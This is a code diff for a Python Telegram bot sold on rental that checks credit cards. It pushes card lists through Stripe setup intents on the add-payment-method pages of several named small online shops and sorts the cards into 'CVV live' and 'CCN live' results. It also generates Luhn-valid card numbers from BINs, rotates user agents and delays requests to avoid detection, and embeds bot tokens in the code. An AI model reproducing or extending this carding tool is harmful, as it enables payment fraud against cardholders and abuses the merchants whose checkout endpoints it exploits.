@@ -7,11 +7,15 @@ import random
 import os
 import json
 import threading
+import asyncio
+# FIXED: Use compatible imports for python-telegram-bot
 from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 from concurrent.futures import ThreadPoolExecutor
 import urllib3
 from datetime import datetime, timedelta
+from html import escape
+import aiohttp
 from queue import Queue
 from fake_useragent import UserAgent
 
@@ -25,26 +29,28 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Environment variables
-BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', "7455342894:AAEJZQdAcICd13uimGrUH1EVIRV1M36uyF8")
-ADMIN_ID = os.getenv('ADMIN_ID', "6764941964")
+# Bot configuration
+BOT_TOKEN = "7455342894:AAEJZQdAcICd13uimGrUH1EVIRV1M36uyF8"
+ADMIN_ID = "6764941964"
 
-# LOGGING BOT CONFIGURATION
-LOGS_BOT_TOKEN = os.getenv('LOGS_BOT_TOKEN', "8389604020:AAHLgIqB3tapLL98F-qZvXi-2dADakCbjfs")
-LOGS_CHAT_ID = os.getenv('LOGS_CHAT_ID', "6764941964")
+# LOGGING BOT CONFIGURATION - Separate bot for error logs
+LOGS_BOT_TOKEN = "8389604020:AAHLgIqB3tapLL98F-qZvXi-2dADakCbjfs"
+LOGS_CHAT_ID = "6764941964"
 
 # BIN API Configuration
 BIN_API_URL = "https://isnotsin.com/bin-info/api?bin="
 
-# Configuration
-GLOBAL_MAX_WORKERS = 50
+# OPTIMIZED: Better thread pool configuration for HIGH multi-user performance
+GLOBAL_MAX_WORKERS = 100
 USER_MAX_WORKERS = 2
 REQUEST_TIMEOUT = 12
 TELEGRAM_TIMEOUT = 8
-MAX_CONCURRENT_USERS = 3
+MAX_CONCURRENT_USERS = 5
 
 # List of authorized user IDs
-AUTHORIZED_USERS = ["6764941964"]
+AUTHORIZED_USERS = [
+    "6764941964",
+]
 
 # File to store rental data
 RENTAL_DATA_FILE = "rentals.json"
@@ -56,13 +62,13 @@ user_info_cache = {}
 site_errors = {}
 MAX_ERROR_REPORTS_PER_HOUR = 2
 
-# Global thread pool
+# OPTIMIZED: Global thread pool with better resource management
 global_thread_pool = ThreadPoolExecutor(max_workers=GLOBAL_MAX_WORKERS, thread_name_prefix="GlobalWorker")
 
-# User sessions
+# User sessions - supports multiple users
 user_sessions = {}
 
-# Active user management
+# Active user management with better concurrency control
 active_users_lock = threading.Lock()
 active_users_count = 0
 
@@ -104,7 +110,7 @@ def save_rental_data():
     except Exception as e:
         logger.error(f"Error saving rental data: {e}")
 
-# Rental system
+# Rental system - stores user_id: expiry_timestamp
 USER_RENTALS = load_rental_data()
 
 # List of target sites
@@ -112,15 +118,15 @@ API_URLS = [
     "https://yayfoods.com.au/my-account/add-payment-method/",
     "https://laseraesthetics.co.nz/my-account/add-payment-method/",
     "https://feelforhair.co.uk/my-account/add-payment-method/",
-    "https://hartleyknows.com.au/my-account/add-payment-method/",
+    "https://rawpassion.com.au/my-account/add-payment-method/",
     "https://totbop.co.uk/my-account/add-payment-method/",
     "https://pacande.com/my-account/add-payment-method/",
-    "https://balhambeds.com/my-account/add-payment-method/",
+    "https://happymuz.com.au/my-account/add-payment-method/",
     "https://shackletonsonline.co.uk/my-account/add-payment-method/",
     "https://mobileframing.com.au/my-account/add-payment-method/",
     "https://paulmanwaring.com/my-account/add-payment-method/",
     "https://farmgalore.ie/my-account/add-payment-method/",
-    "https://bigebearded.com/my-account/add-payment-method/",
+    "https://jamesportwines.com/my-account/add-payment-method/",
     "https://flamessteakhouse.co.uk/my-account/add-payment-method/",
     "https://langtonbrewery.co.uk/my-account/add-payment-method/",
     "https://sponsoredadrenaline.com/my-account/add-payment-method/",
@@ -132,14 +138,15 @@ API_URLS = [
 ]
 
 # Maximum cards limit
-MAX_CARDS_LIMIT = 300
+MAX_CARDS_LIMIT = 500
 
-# Create session with connection pooling
+# OPTIMIZED: Connection pooling with session reuse for HIGH performance
 def create_session():
+    """Create a requests session with connection pooling"""
     session = requests.Session()
     adapter = requests.adapters.HTTPAdapter(
-        pool_connections=20,
-        pool_maxsize=50,
+        pool_connections=50,
+        pool_maxsize=200,
         max_retries=1,
         pool_block=False
     )
@@ -150,15 +157,19 @@ def create_session():
 # Global session for connection pooling
 global_session = create_session()
 
+# UPDATED: Pure results only - only real CVV Live and CCN Live count as live
 def parse_stripe_response(response_text):
     resp_lower = response_text.lower()
     
+    # ONLY REAL CVV LIVE - Transaction succeeded
     if any(msg in resp_lower for msg in ["succeeded", "payment complete", "setup_intent_succeeded"]):
         return {'status': 'cvv_live', 'rawMessage': 'CVV LIVE: Transaction Succeeded'}
     
+    # ONLY REAL CCN LIVE - Wrong CVV but valid card
     if any(msg in resp_lower for msg in ["incorrect_cvc", "security code is incorrect"]):
         return {'status': 'ccn_live', 'rawMessage': 'CCN LIVE: Incorrect CVC'}
     
+    # EVERYTHING ELSE IS DECLINED (including insufficient funds and 3ds/otp)
     if any(msg in resp_lower for msg in ["insufficient_funds", "3ds", "authentication", "otp", "verification", "challenge"]):
         return {'status': 'declined', 'rawMessage': 'Declined'}
     
@@ -177,6 +188,7 @@ def parse_stripe_response(response_text):
     if any(msg in resp_lower for msg in ["pickup_card", "stolen_card", "lost_card"]):
         return {'status': 'declined', 'rawMessage': 'Declined: Card reported lost/stolen'}
     
+    # DEFAULT TO DECLINED
     return {'status': 'declined', 'rawMessage': 'Declined: No positive indicators'}
 
 def fetch_nonce_and_key(url):
@@ -201,6 +213,7 @@ def fetch_nonce_and_key(url):
         send_error_log_sync(error_msg)
         return {'nonce': None, 'key': None}
 
+# OPTIMIZED: Non-blocking card processing with queue system
 class UserCardProcessor:
     def __init__(self, user_session):
         self.user_session = user_session
@@ -210,12 +223,15 @@ class UserCardProcessor:
         self.approved_cards = []
         
     def start_processing(self, cards):
+        """Start processing cards for this user"""
         self.processing = True
         self.approved_cards = []
         
+        # Add all cards to queue
         for card in cards:
             self.card_queue.put(card)
             
+        # Start worker threads for this user
         for i in range(USER_MAX_WORKERS):
             worker = threading.Thread(
                 target=self._card_worker, 
@@ -227,7 +243,9 @@ class UserCardProcessor:
             self.workers.append(worker)
             
     def stop_processing(self):
+        """Stop processing for this user"""
         self.processing = False
+        # Clear the queue
         while not self.card_queue.empty():
             try:
                 self.card_queue.get_nowait()
@@ -236,26 +254,35 @@ class UserCardProcessor:
         self.workers.clear()
         
     def _card_worker(self, worker_id):
+        """Worker thread to process cards for this user"""
         headers = prepare_headers()
         
         while self.processing and not self.card_queue.empty():
             try:
+                # Add delay between requests to avoid detection
                 time.sleep(0.3)
+                
                 card = self.card_queue.get(timeout=0.5)
                 if card is None:
                     break
+                    
+                # Process the card
                 self._process_single_card(card, headers, worker_id)
                 self.card_queue.task_done()
+                
             except Exception as e:
                 continue
                 
     def _process_single_card(self, card, headers, worker_id):
+        """Process a single card"""
         if not self.user_session["checking"]:
             return
             
         try:
+            # Update current card info for display
             self.user_session["current_card_info"] = {"card": card}
             
+            # Parse card details
             try:
                 card_parts = card.split('|')
                 if len(card_parts) < 4:
@@ -270,6 +297,7 @@ class UserCardProcessor:
                 self.user_session["current_index"] += 1
                 return
 
+            # Get site and nonce/key
             site_url = random.choice(API_URLS)
             result = fetch_nonce_and_key(site_url)
             nonce = result['nonce']
@@ -280,6 +308,7 @@ class UserCardProcessor:
                 self.user_session["current_index"] += 1
                 return
                 
+            # Prepare Stripe data
             uuids = generate_uuids()
             stripe_data = {
                 'type': 'card',
@@ -294,6 +323,7 @@ class UserCardProcessor:
                 '_stripe_version': '2024-06-20',
             }
             
+            # Get payment method ID from Stripe
             try:
                 stripe_response = global_session.post(
                     "https://api.stripe.com/v1/payment_methods", 
@@ -307,15 +337,18 @@ class UserCardProcessor:
                     stripe_data_response = stripe_response.json()
                     payment_method_id = stripe_data_response.get('id')
                     
+                    # Check for Stripe-level errors first
                     if stripe_data_response.get('error'):
                         error_code = stripe_data_response['error'].get('code', '')
                         error_message = stripe_data_response['error'].get('message', '')
                         
+                        # Map Stripe errors directly
                         if error_code in ['invalid_number', 'incorrect_number']:
                             self.user_session["stats"]["declined"] += 1
                             self.user_session["current_index"] += 1
                             return
                         elif error_code in ['invalid_cvc', 'incorrect_cvc']:
+                            # This is CCN live - card is valid but CVV wrong
                             self.user_session["stats"]["ccn_live"] += 1
                             self._save_live_card(card, 'CCN LIVE: Incorrect CVC', 'CCN')
                             approved_card_info = {
@@ -336,6 +369,7 @@ class UserCardProcessor:
                             self.user_session["current_index"] += 1
                             return
                         else:
+                            # Other Stripe errors treated as declined
                             self.user_session["stats"]["declined"] += 1
                             self.user_session["current_index"] += 1
                             return
@@ -345,6 +379,7 @@ class UserCardProcessor:
                         self.user_session["current_index"] += 1
                         return
                 else:
+                    # Stripe API call failed
                     self.user_session["stats"]["declined"] += 1
                     self.user_session["current_index"] += 1
                     return
@@ -354,6 +389,7 @@ class UserCardProcessor:
                 self.user_session["current_index"] += 1
                 return
 
+            # Prepare setup data
             setup_data = {
                 'action': 'create_and_confirm_setup_intent',
                 'wc-stripe-payment-method': payment_method_id,
@@ -361,8 +397,10 @@ class UserCardProcessor:
                 '_ajax_nonce': nonce,
             }
             
+            # Get BIN info from API
             bin_info = fetch_bin_info(number)
             
+            # Confirm setup intent
             try:
                 confirm_response = global_session.post(
                     site_url, 
@@ -374,8 +412,11 @@ class UserCardProcessor:
                 )
                 if confirm_response.status_code == 200:
                     response_text = confirm_response.text
+                    
+                    # Parse the response using the FIXED function
                     result = parse_stripe_response(response_text)
                     
+                    # Track approved cards - ONLY CVV_LIVE and CCN_LIVE are considered "approved"
                     if result['status'] == 'cvv_live':
                         self.user_session["stats"]["cvv_live"] += 1
                         self._save_live_card(card, result['rawMessage'], 'AUTH')
@@ -397,6 +438,8 @@ class UserCardProcessor:
                             'bin_info': bin_info
                         }
                         self.approved_cards.append(approved_card_info)
+                        
+                    # EVERYTHING ELSE IS DECLINED
                     else:
                         self.user_session["stats"]["declined"] += 1
                         self._save_declined_card(card, result)
@@ -413,9 +456,11 @@ class UserCardProcessor:
         self.user_session["current_card_info"] = None
         
     def get_approved_cards(self):
+        """Get the list of approved cards"""
         return self.approved_cards
         
     def _save_live_card(self, card, message, card_type):
+        """Save live card to file"""
         try:
             with open(f'{card_type}_{self.user_session["chat_id"]}.txt', 'a') as f:
                 f.write(f"{card} | {message}\n")
@@ -423,13 +468,16 @@ class UserCardProcessor:
             logger.error(f"Error saving {card_type} card: {e}")
             
     def _save_declined_card(self, card, result):
+        """Save declined card to file"""
         try:
             with open(f'DECLINED_{self.user_session["chat_id"]}.txt', 'a') as f:
                 f.write(f"{card} | {result['rawMessage']}\n")
         except Exception as e:
             logger.error(f"Error saving declined card: {e}")
 
+# NEW FUNCTION: Create approved cards results file
 def create_approved_cards_file(user_session, approved_cards):
+    """Create results.txt file with approved cards in the exact format"""
     try:
         chat_id = user_session["chat_id"]
         filename = f"results_{chat_id}.txt"
@@ -458,12 +506,16 @@ def create_approved_cards_file(user_session, approved_cards):
         logger.error(f"Error creating approved cards file: {e}")
         return None
 
+# NEW FUNCTION: Send approved cards file only
 def send_approved_cards_file(user_session, approved_cards):
+    """Send only the approved cards file with exact format"""
     try:
         chat_id = user_session["chat_id"]
         total_approved = len(approved_cards)
         
+        # Only send file if there are approved cards
         if total_approved > 0:
+            # Create approved cards file
             approved_filename = create_approved_cards_file(user_session, approved_cards)
             
             if approved_filename and os.path.exists(approved_filename):
@@ -477,6 +529,7 @@ def send_approved_cards_file(user_session, approved_cards):
                         }
                         response = global_session.post(url, files=files, data=data, timeout=TELEGRAM_TIMEOUT)
                     
+                    # Clean up file after sending
                     try:
                         os.remove(approved_filename)
                     except:
@@ -488,7 +541,9 @@ def send_approved_cards_file(user_session, approved_cards):
     except Exception as e:
         logger.error(f"Error sending approved cards file: {e}")
 
+# MODIFIED: Build keyboard without insufficient funds and 3DS/OTP
 def build_keyboard(task_id, counts, current_card_info):
+    """Builds the inline keyboard for the mass check UI."""
     status = counts.get('status', 'Running')
     
     if status == 'Completed':
@@ -514,21 +569,28 @@ def build_keyboard(task_id, counts, current_card_info):
     
     return InlineKeyboardMarkup(buttons)
 
+# MODIFIED: checking_thread to send approved cards file after completion
 def checking_thread(user_session):
+    """Optimized checking thread that sends approved cards file after completion"""
     try:
+        # Mark user as active
         with active_users_lock:
             global active_users_count
             active_users_count += 1
             user_session["active"] = True
             logger.info(f"User {user_session['chat_id']} started checking. Active users: {active_users_count}")
         
+        # Send initial progress update
         update_progress_message_sync(user_session)
         
+        # Create card processor for this user
         processor = UserCardProcessor(user_session)
         user_session["processor"] = processor
         
+        # Start processing cards
         processor.start_processing(user_session["cards"])
         
+        # Monitor progress without blocking
         total_cards = len(user_session["cards"])
         last_update_time = time.time()
         update_interval = 2.0
@@ -537,6 +599,7 @@ def checking_thread(user_session):
                user_session["current_index"] < total_cards and
                processor.processing):
             
+            # Update progress periodically
             current_time = time.time()
             if current_time - last_update_time >= update_interval:
                 update_progress_message_sync(user_session)
@@ -544,14 +607,23 @@ def checking_thread(user_session):
                 
             time.sleep(0.3)
             
+        # MODIFIED: Send approved cards file after completion
         if user_session["checking"]:
+            # Get approved cards from processor
             approved_cards = processor.get_approved_cards()
+            
+            # Update progress with final results
             update_progress_message_sync(user_session)
+            
+            # Send approved cards file (no live notifications, just the file)
             send_approved_cards_file(user_session, approved_cards)
+            
+            # Send final results
             send_final_results_sync(user_session)
             
     except Exception as e:
         logger.error(f"Error in checking_thread: {e}")
+        # Send error update
         try:
             stats = user_session["stats"]
             total = stats["total"]
@@ -579,9 +651,11 @@ def checking_thread(user_session):
         except Exception as update_error:
             logger.error(f"Error updating error message: {update_error}")
     finally:
+        # Clean up processor
         if user_session.get("processor"):
             user_session["processor"].stop_processing()
             
+        # Mark user as inactive
         with active_users_lock:
             active_users_count -= 1
             user_session["active"] = False
@@ -590,6 +664,7 @@ def checking_thread(user_session):
 
 # Luhn algorithm functions
 def luhn_checksum(card_number):
+    """Calculate Luhn checksum for a card number"""
     def digits_of(n):
         return [int(d) for d in str(n)]
     
@@ -602,9 +677,11 @@ def luhn_checksum(card_number):
     return checksum % 10
 
 def is_luhn_valid(card_number):
+    """Check if card number passes Luhn validation"""
     return luhn_checksum(card_number) == 0
 
 def calculate_luhn_check_digit(partial_card_number):
+    """Calculate the Luhn check digit for a partial card number"""
     def digits_of(n):
         return [int(d) for d in str(n)]
     
@@ -618,20 +695,25 @@ def calculate_luhn_check_digit(partial_card_number):
     return (10 - (checksum % 10)) % 10
 
 def generate_valid_card(custom_prefix, length=16):
+    """Generate a valid card number with custom prefix and Luhn check digit"""
+    # Remove any spaces or dashes from custom prefix
     custom_prefix = custom_prefix.replace(' ', '').replace('-', '')
     
-    remaining_length = length - len(custom_prefix) - 1
+    # Generate random middle digits
+    remaining_length = length - len(custom_prefix) - 1  # -1 for check digit
     if remaining_length < 0:
         raise ValueError("Custom prefix too long for card length")
     
     middle_digits = ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
     partial_card = custom_prefix + middle_digits
     
+    # Calculate Luhn check digit
     check_digit = calculate_luhn_check_digit(partial_card)
     
     return partial_card + str(check_digit)
 
 def generate_cards(custom_prefix, count=10, length=16):
+    """Generate multiple valid card numbers with custom prefix and Luhn validation"""
     cards = []
     for _ in range(count):
         try:
@@ -645,9 +727,12 @@ def generate_cards(custom_prefix, count=10, length=16):
     return cards
 
 def generate_random_expiry():
+    """Generate random month and year"""
+    # Random month (1-12)
     month = random.randint(1, 12)
     month_str = f"{month:02d}"
     
+    # Random year (current year to current year + 5)
     current_year = datetime.now().year
     year = random.randint(current_year, current_year + 5)
     year_str_4d = str(year)
@@ -655,7 +740,8 @@ def generate_random_expiry():
     
     return month_str, year_str_4d, year_str_2d
 
-def get_user_info(user_id):
+# FIXED: Synchronous version of get_user_info to avoid async issues
+def get_user_info_sync(user_id):
     """Get username and first name for a user ID - synchronous version"""
     try:
         if user_id in user_info_cache:
@@ -680,6 +766,7 @@ def get_user_info(user_id):
     return f"User_{user_id}"
 
 def get_rental_days_left(expiry_timestamp):
+    """Calculate days left for rental"""
     current_time = datetime.now().timestamp()
     if current_time >= expiry_timestamp:
         return 0
@@ -688,6 +775,7 @@ def get_rental_days_left(expiry_timestamp):
     return max(0, days_left)
 
 def get_rental_time_left_detailed(expiry_timestamp):
+    """Calculate detailed time left for rental (days, hours, minutes)"""
     current_time = datetime.now().timestamp()
     if current_time >= expiry_timestamp:
         return 0, 0, 0
@@ -700,6 +788,7 @@ def get_rental_time_left_detailed(expiry_timestamp):
     return days, hours, minutes
 
 def send_error_log_sync(error_message):
+    """Send error log to logging bot with rate limiting"""
     try:
         site_match = re.search(r'Gateway Error on (.*?):', error_message)
         if site_match:
@@ -731,6 +820,7 @@ def send_error_log_sync(error_message):
         return None
 
 def is_authorized(user_id):
+    """Check if user is authorized to use the bot"""
     user_id_str = str(user_id)
     
     if user_id_str in AUTHORIZED_USERS:
@@ -748,9 +838,11 @@ def is_authorized(user_id):
     return False
 
 def is_admin(user_id):
+    """Check if user is admin"""
     return str(user_id) == ADMIN_ID
 
 def get_rental_time_left(user_id):
+    """Get remaining rental time in hours and minutes"""
     user_id_str = str(user_id)
     if user_id_str in USER_RENTALS:
         expiry_time = USER_RENTALS[user_id_str]
@@ -763,6 +855,7 @@ def get_rental_time_left(user_id):
     return 0, 0
 
 def add_rental(user_id, days=1):
+    """Add rental access for user"""
     user_id_str = str(user_id)
     expiry_time = datetime.now() + timedelta(days=days)
     USER_RENTALS[user_id_str] = expiry_time.timestamp()
@@ -770,6 +863,7 @@ def add_rental(user_id, days=1):
     return expiry_time
 
 def remove_rental(user_id):
+    """Remove rental access for user"""
     user_id_str = str(user_id)
     if user_id_str in USER_RENTALS:
         del USER_RENTALS[user_id_str]
@@ -778,6 +872,7 @@ def remove_rental(user_id):
     return False
 
 def cleanup_expired_rentals():
+    """Remove expired rentals from the data"""
     current_time = datetime.now().timestamp()
     expired_users = []
     
@@ -792,7 +887,9 @@ def cleanup_expired_rentals():
         save_rental_data()
         logger.info(f"Cleaned up {len(expired_users)} expired rentals")
 
+# OPTIMIZED: Get user session with better resource management
 def get_user_session(chat_id):
+    """Get or create user session with resource limits"""
     if chat_id not in user_sessions:
         user_sessions[chat_id] = {
             "checking": False,
@@ -815,12 +912,16 @@ def get_user_session(chat_id):
         }
     return user_sessions[chat_id]
 
+# OPTIMIZED: Check if system can handle more users
 def can_accept_new_user():
+    """Check if system can accept new checking users"""
     with active_users_lock:
         active_count = active_users_count
         return active_count < MAX_CONCURRENT_USERS
 
+# OPTIMIZED: Faster BIN lookup with connection pooling
 def fetch_bin_info(card_number):
+    """Fetch BIN info from API"""
     try:
         bin_number = card_number[:6]
         response = global_session.get(f"{BIN_API_URL}{bin_number}", timeout=5)
@@ -869,6 +970,7 @@ def fetch_bin_info(card_number):
     }
 
 def send_telegram_message_sync(message, chat_id, parse_mode='HTML', reply_markup=None):
+    """Sync version of telegram message sending with better error handling"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         params = {
@@ -880,6 +982,7 @@ def send_telegram_message_sync(message, chat_id, parse_mode='HTML', reply_markup
             params['reply_markup'] = reply_markup.to_json()
         response = global_session.post(url, json=params, timeout=TELEGRAM_TIMEOUT)
         
+        # Log if there's an error
         if response.status_code != 200:
             logger.warning(f"Failed to send message to chat {chat_id}: {response.text}")
             
@@ -889,6 +992,7 @@ def send_telegram_message_sync(message, chat_id, parse_mode='HTML', reply_markup
         return None
 
 def edit_telegram_message_sync(message, chat_id, message_id, parse_mode='HTML', reply_markup=None):
+    """Sync version of telegram message editing with better error handling"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
         params = {
@@ -901,6 +1005,7 @@ def edit_telegram_message_sync(message, chat_id, message_id, parse_mode='HTML', 
             params['reply_markup'] = reply_markup.to_json()
         response = global_session.post(url, json=params, timeout=TELEGRAM_TIMEOUT)
         
+        # Log if there's an error
         if response.status_code != 200:
             logger.warning(f"Failed to edit message {message_id} for chat {chat_id}: {response.text}")
             
@@ -913,6 +1018,7 @@ def generate_uuids():
     return {"gu": str(uuid.uuid4()), "mu": str(uuid.uuid4()), "si": str(uuid.uuid4())}
 
 def prepare_headers():
+    """Generate random user agent with better rotation"""
     try:
         if ua is not None:
             user_agent = ua.random
@@ -933,6 +1039,7 @@ def prepare_headers():
     }
 
 def format_card_display(card, current_index, total_cards):
+    """Format card display in x/y - card details format"""
     try:
         card_parts = card.split('|')
         if len(card_parts) >= 4:
@@ -972,6 +1079,7 @@ def update_progress_message_sync(user_session):
             'current': current
         }
         
+        # More descriptive progress message
         progress_percentage = (current / total) * 100 if total > 0 else 0
         progress_message = f"🔄 Processing... {current}/{total} ({progress_percentage:.1f}%)"
         
@@ -982,6 +1090,7 @@ def update_progress_message_sync(user_session):
                 user_session["message_id"],
                 reply_markup=build_keyboard(task_id, counts, current_card_info)
             )
+            # If message editing fails (message not found), send a new one
             if response and response.status_code != 200:
                 response = send_telegram_message_sync(
                     progress_message, 
@@ -1037,25 +1146,27 @@ def send_final_results_sync(user_session):
     except Exception as e:
         logger.error(f"Error sending final results: {e}")
 
-def safe_send_message_sync(update, text, parse_mode='HTML', reply_markup=None):
+async def safe_send_message(update: Update, text: str, parse_mode='HTML', reply_markup=None):
+    """Safely send message with timeout handling"""
     try:
-        update.message.reply_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
+        await update.message.reply_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
     except Exception as e:
         logger.error(f"Error sending message: {e}")
 
-def check_access_sync(update):
+async def check_access(update: Update):
+    """Check if user is authorized"""
     user_id = str(update.effective_user.id)
     if not is_authorized(user_id):
         hours, minutes = get_rental_time_left(user_id)
         if hours > 0 or minutes > 0:
-            safe_send_message_sync(
+            await safe_send_message(
                 update,
                 f"🚫 <b>Rental Expired</b>\n\n"
                 f"Your rental access has expired.\n"
                 f"Contact @mcchiatoos to renew your access."
             )
         else:
-            safe_send_message_sync(
+            await safe_send_message(
                 update,
                 "🚫 <b>Access Denied</b>\n\n"
                 "You are not authorized to use this bot.\n\n"
@@ -1068,9 +1179,11 @@ def check_access_sync(update):
         return False
     return True
 
-def handle_stop_callback(update, context):
+# MODIFIED: Handle stop button callback - preserve statistics display and send approved cards file
+async def handle_stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle stop button callback - preserve statistics display and send approved cards file"""
     query = update.callback_query
-    query.answer()
+    await query.answer()
     
     callback_data = query.data
     if callback_data.startswith('stop_masschk_'):
@@ -1084,6 +1197,7 @@ def handle_stop_callback(update, context):
                     stats = session["stats"]
                     total = stats["total"]
                     
+                    # MODIFIED: Get approved cards from processor before stopping
                     approved_cards = []
                     if session.get("processor"):
                         approved_cards = session["processor"].get_approved_cards()
@@ -1100,28 +1214,31 @@ def handle_stop_callback(update, context):
                     
                     stopped_message = "🛑 Processing Stopped"
                     
-                    query.edit_message_text(
+                    await query.edit_message_text(
                         text=stopped_message,
                         parse_mode='HTML',
                         reply_markup=build_keyboard(task_id, final_counts, session.get("current_card_info"))
                     )
                     
+                    # NEW: Send approved cards file after stopping
                     if approved_cards:
                         send_approved_cards_file(session, approved_cards)
                     
                     return
                 else:
-                    query.answer("No active checking session found!", show_alert=True)
+                    await query.answer("No active checking session found!", show_alert=True)
                     return
         
-        query.answer("Session not found!", show_alert=True)
+        await query.answer("Session not found!", show_alert=True)
 
-def handle_noop_callback(update, context):
+async def handle_noop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle noop callback (do nothing)"""
     query = update.callback_query
-    query.answer()
+    await query.answer()
 
-def start_command(update, context):
-    safe_send_message_sync(
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle the /start command"""
+    await safe_send_message(
         update,
         " <b>Mang Biroy AUTH</b>\n\n"
         "📁 <b>Send cc.txt file with cards to check.</b>\n\n"
@@ -1130,8 +1247,10 @@ def start_command(update, context):
         "DM @mcchiatoos for any problem"
     )
 
-def stop_command(update, context):
-    if not check_access_sync(update):
+# MODIFIED: Stop command to send approved cards file
+async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle the /stop command"""
+    if not await check_access(update):
         return
         
     chat_id = update.message.chat_id
@@ -1140,20 +1259,23 @@ def stop_command(update, context):
     if user_session["checking"]:
         user_session["checking"] = False
         
+        # NEW: Get approved cards before stopping
         approved_cards = []
         if user_session.get("processor"):
             approved_cards = user_session["processor"].get_approved_cards()
             user_session["processor"].stop_processing()
         
-        safe_send_message_sync(update, "🛑 Checking stopped!")
+        await safe_send_message(update, "🛑 Checking stopped!")
         
+        # NEW: Send approved cards file
         if approved_cards:
             send_approved_cards_file(user_session, approved_cards)
     else:
-        safe_send_message_sync(update, "❌ No active checking session!")
+        await safe_send_message(update, "❌ No active checking session!")
 
-def stats_command(update, context):
-    if not check_access_sync(update):
+async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle the /stats command"""
+    if not await check_access(update):
         return
         
     chat_id = update.message.chat_id
@@ -1167,7 +1289,7 @@ def stats_command(update, context):
         with active_users_lock:
             active_count = active_users_count
         
-        safe_send_message_sync(
+        await safe_send_message(
             update,
             f" <b>Current Stats</b>\n\n"
             f"✅ CVV Live: {stats['cvv_live']}\n"
@@ -1178,13 +1300,14 @@ def stats_command(update, context):
             f" Total: {total}"
         )
     else:
-        safe_send_message_sync(update, "❌ No active checking session!")
+        await safe_send_message(update, "❌ No active checking session!")
 
-def myaccess_command(update, context):
+async def myaccess_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle the /myaccess command"""
     user_id = str(update.effective_user.id)
     
     if user_id in AUTHORIZED_USERS:
-        safe_send_message_sync(
+        await safe_send_message(
             update,
             "✅ <b>Permanent Access</b>\n\n"
             "You have permanent access to this bot."
@@ -1206,21 +1329,21 @@ def myaccess_command(update, context):
             
             time_left_str = ", ".join(time_left_parts)
             
-            safe_send_message_sync(
+            await safe_send_message(
                 update,
                 f" <b>Rental Access</b>\n\n"
                 f" <b>Time Left:</b> {time_left_str}\n\n"
                 f"Contact @mcchiatoos to renew"
             )
         else:
-            safe_send_message_sync(
+            await safe_send_message(
                 update,
                 "🚫 <b>Rental Expired</b>\n\n"
                 "Your rental access has expired.\n"
                 "Contact @mcchiatoos to renew your access."
             )
     else:
-        safe_send_message_sync(
+        await safe_send_message(
             update,
             "🚫 <b>No Access</b>\n\n"
             "You don't have access to this bot.\n\n"
@@ -1231,12 +1354,13 @@ def myaccess_command(update, context):
             "Contact @mcchiatoos for rental access."
         )
 
-def bin_command(update, context):
-    if not check_access_sync(update):
+async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle the /bin command for BIN lookup"""
+    if not await check_access(update):
         return
         
     if not context.args:
-        safe_send_message_sync(
+        await safe_send_message(
             update,
             "❌ <b>Usage:</b> /bin [BIN]\n\n"
             "Example: <code>/bin 411111</code>"
@@ -1246,7 +1370,7 @@ def bin_command(update, context):
     bin_number = context.args[0].strip()
     
     if not bin_number.isdigit() or len(bin_number) != 6:
-        safe_send_message_sync(
+        await safe_send_message(
             update,
             "❌ <b>Invalid BIN</b>\n\n"
             "Please provide a valid 6-digit BIN number.\n"
@@ -1254,7 +1378,7 @@ def bin_command(update, context):
         )
         return
     
-    safe_send_message_sync(update, "🔍 <b>Looking up BIN information...</b>")
+    await safe_send_message(update, "🔍 <b>Looking up BIN information...</b>")
     
     try:
         bin_info = fetch_bin_info(bin_number + "000000")
@@ -1268,18 +1392,19 @@ def bin_command(update, context):
 <b>Bank:</b> {bin_info['Bank']}
 <b>Country:</b> {bin_info['Country']} {bin_info['Emoji']}"""
         
-        safe_send_message_sync(update, bin_message)
+        await safe_send_message(update, bin_message)
         
     except Exception as e:
         logger.error(f"Error in BIN lookup: {e}")
-        safe_send_message_sync(
+        await safe_send_message(
             update,
             "❌ <b>Error looking up BIN</b>\n\n"
             "Please try again later."
         )
 
-def active_command(update, context):
-    if not check_access_sync(update):
+async def active_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle the /active command to show active users"""
+    if not await check_access(update):
         return
         
     with active_users_lock:
@@ -1289,21 +1414,22 @@ def active_command(update, context):
     if active_users:
         user_list = []
         for session in active_users:
-            user_info = get_user_info(session["chat_id"])
+            user_info = get_user_info_sync(session["chat_id"])  # FIXED: Use sync version
             progress = f"{session['current_index']}/{session['stats']['total']}"
             user_list.append(f"👤 {user_info} -  {progress}")
         
-        safe_send_message_sync(
+        await safe_send_message(
             update,
             f"👥 <b>Active Users</b>\n\n"
             f"Total Active: {active_count}\n\n"
             + "\n".join(user_list)
         )
     else:
-        safe_send_message_sync(update, "🔍 <b>No active users currently checking.</b>")
+        await safe_send_message(update, "🔍 <b>No active users currently checking.</b>")
 
-def system_command(update, context):
-    if not check_access_sync(update):
+async def system_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show system status and performance metrics"""
+    if not await check_access(update):
         return
         
     with active_users_lock:
@@ -1327,20 +1453,21 @@ def system_command(update, context):
     if active_users:
         user_list = []
         for session in active_users:
-            user_info = get_user_info(session["chat_id"])
+            user_info = get_user_info_sync(session["chat_id"])  # FIXED: Use sync version
             progress = f"{session['current_index']}/{session['stats']['total']}"
             user_list.append(f"• {user_info} - {progress} cards")
         
         system_info += f"\n\n<b>Active Sessions:</b>\n" + "\n".join(user_list)
     
-    safe_send_message_sync(update, system_info)
